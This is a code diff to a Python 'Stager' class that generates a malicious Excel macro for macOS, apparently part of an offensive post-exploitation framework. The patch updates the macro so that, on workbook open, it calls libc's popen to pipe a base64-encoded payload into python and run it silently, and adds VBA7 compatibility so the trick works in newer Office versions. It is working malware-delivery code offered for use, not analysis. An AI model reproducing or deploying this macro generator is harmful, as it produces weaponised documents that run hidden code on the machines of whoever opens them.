@@ -85,13 +85,23 @@ class Stager:
                 payload = formStr("cmd", match)
 
             macro = """
-Private Declare Function system Lib "libc.dylib" (ByVal command As String) As Long
+Option Explicit
+
+#If VBA7 Then
+Private Declare PtrSafe Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As LongPtr
+#Else
+Private Declare Function popen Lib "libc.dylib" (ByVal command As String, ByVal mode As String) As Long
+#End If
 
 Private Sub Workbook_Open()
-    Dim result As Long
     Dim cmd As String
     %s
-    result = system("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &")
+    #If VBA7 Then
+    Dim result As LongPtr
+    #Else
+    Dim result As Long
+    #End If
+    result = popen("echo ""import sys,base64;exec(base64.b64decode(\\\"\" \" & cmd & \" \\\"\"));"" | python &", "r")
 End Sub
 """ %(payload)
 
